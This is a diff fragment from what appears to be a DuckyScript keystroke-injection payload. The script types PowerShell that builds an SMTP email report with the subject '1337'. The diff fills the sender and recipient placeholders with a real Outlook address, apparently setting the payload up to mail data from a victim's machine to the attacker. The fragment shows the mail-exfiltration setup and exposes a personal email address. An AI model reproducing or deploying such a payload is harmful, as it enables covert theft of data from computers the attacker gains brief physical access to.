@@ -41,9 +41,9 @@ STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDER-E
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
-STRING $ReportEmail.From = 'SENDER-EMAIL'
+STRING $ReportEmail.From = 'Elistidham1@outlook.com'
 ENTER
-STRING $ReportEmail.To.Add('RECEIVER-EMAIL')
+STRING $ReportEmail.To.Add('Elistidham1@outlook.com')
 ENTER
 STRING $ReportEmail.Subject = "1337"
 ENTER
